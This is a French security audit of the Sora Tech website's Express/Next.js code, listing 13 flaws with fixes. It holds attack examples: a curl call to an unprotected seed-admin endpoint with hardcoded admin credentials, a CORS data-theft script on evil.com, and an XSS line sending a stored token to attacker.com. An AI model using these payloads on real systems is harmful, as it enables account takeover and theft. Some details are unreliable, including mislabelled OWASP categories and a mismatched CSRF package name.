# 🔒 AUDIT SÉCURITÉ - SORA TECH WEBSITE

**Date:** 1 Mai 2026  
**Environnement:** Production (Railway + Vercel)  
**Niveau de risque:** ⚠️ **CRITIQUE**

---

## 📋 RÉSUMÉ EXÉCUTIF

Le projet contient **13 failles de sécurité majeures** :
- **3 Critiques** : Risque d'accès non autorisé, injection, compromission complète
- **7 Élevées** : Usurpation d'identité, vol de données, attaques DoS
- **3 Moyennes** : Fuite d'info, dégradation de performance

---

## 🔴 FAILLES CRITIQUES

### 1. **Endpoint `/api/auth/seed-admin` PUBLIQUE et non protégée**
**Fichier:** `backend/src/routes/auth.js:9`  
**Sévérité:** 🔴 CRITIQUE

**Le problème:**
```javascript
router.post('/seed-admin', seedAdmin); // ❌ AUCUNE PROTECTION!
```

**Impact:**
- N'importe qui peut accéder à `POST /api/auth/seed-admin`
- Crée un super admin avec identifiants hardcodés: `admin@soratech.ci / admin123`
- Accès administrateur complet au système

**PoC:**
```bash
curl -X POST https://soratech.ci/api/auth/seed-admin
# Réponse: "Admin créé : admin@soratech.ci / admin123"
```

**FIX IMMÉDIAT:**
```javascript
// ❌ AVANT:
router.post('/seed-admin', seedAdmin);

// ✅ APRÈS:
// - Supprimer cet endpoint en production
// - OU le protéger ET vérifier si déjà un admin existe
router.post('/seed-admin', protect, atLeast('super_admin'), seedAdmin);
```

---

### 2. **CORS trop permissif - Accepte TOUTES les origines**
**Fichier:** `backend/src/index.js:20-23`  
**Sévérité:** 🔴 CRITIQUE

**Le problème:**
```javascript
app.use(cors({
  origin: true,      // ❌ Accepte TOUTES les origines!
  credentials: true,  // ❌ Avec cookies/auth inclus
}));
```

**Impact:**
- Attaque CSRF depuis n'importe quel site malveillant
- Vol de tokens/cookies depuis une page tierce
- Accès API depuis domaines malveillants

**Exemple d'attaque:**
```html
<!-- Sur evil.com -->
<script>
  fetch('https://soratech.ci/api/users', {
    credentials: 'include', // Envoie les cookies
    method: 'GET'
  }).then(r => r.json()).then(data => {
    // Vole les données utilisateurs
  });
</script>
```

**FIX IMMÉDIAT:**
```javascript
// ✅ APRÈS:
const allowedOrigins = [
  'https://soratech.ci',
  'https://www.soratech.ci',
  'https://admin.soratech.ci'
];

app.use(cors({
  origin: allowedOrigins,
  credentials: true,
  optionsSuccessStatus: 200,
  methods: ['GET', 'POST', 'PATCH', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  maxAge: 86400 // 24h
}));
```

---

### 3. **JWT stocké en localStorage - Vulnérable aux XSS**
**Fichiers:** 
- `lib/auth.tsx:21` 
- `lib/api.ts:5`  
**Sévérité:** 🔴 CRITIQUE

**Le problème:**
```javascript
// ❌ PROBLÈME:
localStorage.setItem('sora_token', r.token);
const token = localStorage.getItem('sora_token');
```

**Impact:**
- N'importe quel script XSS peut voler le token
- Attaquant accède à tous les endpoints avec ce compte
- Pas de protection contre les cookies malveillants

**Exemple d'attaque XSS:**
```javascript
// Injected dans le HTML
setInterval(() => {
  fetch('https://attacker.com/steal?token=' + localStorage.getItem('sora_token'));
}, 1000);
```

**FIX IMMÉDIAT:**
```javascript
// ✅ APRÈS: Utiliser les httpOnly cookies
// Backend:
res.cookie('token', jwt_token, {
  httpOnly: true,      // ❌ JS ne peut pas y accéder
  secure: true,        // HTTPS seulement
  sameSite: 'strict',  // CSRF protection
  maxAge: 7 * 24 * 60 * 60 * 1000 // 7 jours
});

// Frontend: Pas besoin de gérer le token, c'est transparent
```

---

## 🟠 FAILLES ÉLEVÉES

### 4. **Pas de Rate Limiting**
**Fichier:** `backend/src/index.js`  
**Sévérité:** 🟠 ÉLEVÉE

**Impact:**
- Brute force sur `/api/auth/login` 
- Spam de commandes
- DoS sur les endpoints publics

**FIX:**
```bash
npm install express-rate-limit
```

```javascript
const rateLimit = require('express-rate-limit');

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 min
  max: 100, // 100 requests par IP
});

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5, // 5 tentatives de login
  message: 'Trop de tentatives, réessayez plus tard'
});

app.use('/api/', limiter);
app.post('/api/auth/login', loginLimiter, login);
```

---

### 5. **Pas de Security Headers (Helmet)**
**Fichier:** `backend/src/index.js`  
**Sévérité:** 🟠 ÉLEVÉE

**Impact:**
- Clickjacking (X-Frame-Options manquant)
- XSS réfléchi (Content-Security-Policy manquant)
- MIME sniffing

**FIX:**
```bash
npm install helmet
```

```javascript
const helmet = require('helmet');
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
    },
  },
}));
```

---

### 6. **Pas de CSRF Protection**
**Fichier:** Frontend + Backend  
**Sévérité:** 🟠 ÉLEVÉE

**Impact:**
- Actions non-autorisées depuis sites externes
- Commandes/devis créés sans consentement

**FIX:**
```bash
npm install csrf
```

```javascript
// Backend: Générer token CSRF
const csrf = require('csurf');
const cookieParser = require('cookie-parser');

app.use(cookieParser());
app.use(csrf({ cookie: true }));

// Frontend: Envoyer le token dans les headers
fetch('/api/devis', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': document.querySelector('meta[name="csrf-token"]').content
  }
});
```

---

### 7. **Content-Security-Policy (CSP) manquante**
**Fichier:** `next.config.ts`  
**Sévérité:** 🟠 ÉLEVÉE

**FIX:**
```typescript
async headers() {
  return [
    {
      source: '/:path*',
      headers: [
        {
          key: 'Content-Security-Policy',
          value: "default-src 'self'; script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net; img-src 'self' data: https:; style-src 'self' 'unsafe-inline';"
        },
        {
          key: 'X-Content-Type-Options',
          value: 'nosniff'
        },
        {
          key: 'X-Frame-Options',
          value: 'DENY'
        },
        {
          key: 'X-XSS-Protection',
          value: '1; mode=block'
        },
        {
          key: 'Strict-Transport-Security',
          value: 'max-age=31536000; includeSubDomains; preload'
        }
      ]
    }
  ];
}
```

---

### 8. **Endpoint `/api/health` expose l'environnement**
**Fichier:** `backend/src/index.js:61-64`  
**Sévérité:** 🟠 ÉLEVÉE

**Le problème:**
```javascript
app.get('/api/health', (req, res) => {
  res.json({ success: true, message: 'SORA TECH API running', 
    env: process.env.NODE_ENV  // ❌ Expose dev/prod!
  });
});
```

**Impact:**
- Révèle si c'est en développement ou production
- Attaquants savent quel type de protection s'attendre

**FIX:**
```javascript
app.get('/api/health', (req, res) => {
  res.json({ success: true, message: 'API operational' });
  // Ne pas exposer l'environnement
});
```

---

### 9. **Pas de validation/sanitization des inputs**
**Fichiers:** Tous les controllers  
**Sévérité:** 🟠 ÉLEVÉE

**Impact:**
- Injection NoSQL
- XSS
- ReDoS (Regular Expression Denial of Service)

**FIX:**
```bash
npm install express-validator
```

```javascript
const { body, validationResult } = require('express-validator');

router.post('/login', [
  body('email').isEmail().normalizeEmail(),
  body('password').isLength({ min: 6 }).trim().escape(),
], (req, res) => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return res.status(400).json({ errors: errors.array() });
  }
  // Continuer...
});
```

---

### 10. **Pas de timeout sur les sessions**
**Fichier:** `lib/auth.tsx` + `backend/src/controllers/authController.js`  
**Sévérité:** 🟠 ÉLEVÉE

**Impact:**
- Sessions ouvertes indéfiniment
- Vol de tokens pendant longtemps

**FIX:**
```javascript
const signToken = (id) => {
  return jwt.sign({ id }, process.env.JWT_SECRET, {
    expiresIn: '24h' // ❌ AVANT: '7d'
  });
};
```

---

### 11. **Mot de passe "admin123" hardcodé**
**Fichier:** `backend/src/controllers/authController.js:82`  
**Sévérité:** 🟠 ÉLEVÉE

**Le problème:**
```javascript
await User.create({ 
  name: 'Super Admin', 
  email: 'admin@soratech.ci', 
  password: 'admin123',  // ❌ Faible + hardcodé!
  role: 'super_admin', 
  active: true 
});
```

**FIX:**
```javascript
// Utiliser une variable d'environnement + password fort
const password = process.env.SEED_ADMIN_PASSWORD || crypto.randomBytes(16).toString('hex');
if (!process.env.SEED_ADMIN_PASSWORD) {
  console.warn('⚠️ GÉNÉREZ UN PASSWORD: SEED_ADMIN_PASSWORD=' + password);
}
```

---

## 🟡 FAILLES MOYENNES

### 12. **Fallback HTTP non-sécurisé**
**Fichier:** `lib/api.ts:1`, `lib/media.ts:1`  
**Sévérité:** 🟡 MOYENNE

**Le problème:**
```javascript
const BASE = process.env.NEXT_PUBLIC_API_URL || 'http://localhost:5000';
// ❌ http:// au lieu de https://
```

**FIX:**
```javascript
const BASE = process.env.NEXT_PUBLIC_API_URL || 'https://api.soratech.ci';
```

---

### 13. **Pas de logs de sécurité**
**Fichier:** `backend/src/index.js`  
**Sévérité:** 🟡 MOYENNE

**Impact:**
- Impossible de tracer les attaques
- Pas de détection d'intrusion

**FIX:**
```bash
npm install winston
```

```javascript
const winston = require('winston');
const logger = winston.createLogger({
  level: 'info',
  format: winston.format.json(),
  defaultMeta: { service: 'sora-api' },
  transports: [
    new winston.transports.File({ filename: 'error.log', level: 'error' }),
    new winston.transports.File({ filename: 'combined.log' })
  ]
});

// Log les tentatives de login échouées
logger.warn(`Login failed for ${email} from ${req.ip}`);
```

---

## 📝 CHECKLIST DE CORRECTION

### Phase 1: URGENT (Cette semaine)
- [ ] Supprimer `/api/auth/seed-admin` endpoint
- [ ] Fixer CORS avec whitelist stricte
- [ ] Migrer JWT vers httpOnly cookies
- [ ] Installer helmet pour security headers
- [ ] Installer rate limiting

### Phase 2: Important (Semaine prochaine)
- [ ] Ajouter express-validator pour inputs
- [ ] Implémenter CSRF protection
- [ ] Ajouter CSP headers
- [ ] Changer password admin
- [ ] Réduire JWT expiration à 24h

### Phase 3: Long terme
- [ ] Logs de sécurité (Winston)
- [ ] WAF (Web Application Firewall) sur Railway
- [ ] Penetration testing
- [ ] OWASP Top 10 review complet

---

## 🚀 DÉPLOIEMENT DES FIXES

```bash
# 1. Créer une branche de sécurité
git checkout -b fix/security-audit

# 2. Appliquer les fixes
# (voir section suivante avec les fichiers modifiés)

# 3. Tester en local
npm run dev  # Frontend
npm start    # Backend (dans /backend)

# 4. Pusher et déployer
git add .
git commit -m "fix: audit sécurité critique - CORS, JWT, seedAdmin"
git push origin fix/security-audit
# Créer une PR pour review

# 5. Déployer sur Railway + Vercel
# Railway: Auto-redeploy depuis main
# Vercel: Auto-redeploy depuis main
```

---

## 📊 Scoring OWASP

| Catégorie | Avant | Après |
|-----------|-------|-------|
| A01: Injection | ⚠️ Élevée | ✅ Basse |
| A03: Injection | ⚠️ Élevée | ✅ Basse |
| A04: Insecure Design | 🔴 Critique | 🟡 Moyenne |
| A05: Broken Access Control | 🔴 Critique | ✅ Basse |
| A07: XSS | ⚠️ Élevée | ✅ Basse |
| A08: Software/Data Integrity | ⚠️ Élevée | ✅ Basse |
| A09: Logging/Monitoring | 🟡 Moyenne | 🟡 Moyenne |

---

## 📞 Prochaines étapes

1. **Appliquer les fixes Phase 1** (3-4h)
2. **Tester en staging** (2h)
3. **Déployer en production** (30 min)
4. **Monitorer les logs** (24h)

**Critique:** Appliquer au moins les fixes Phase 1 AVANT d'aller en production complète.
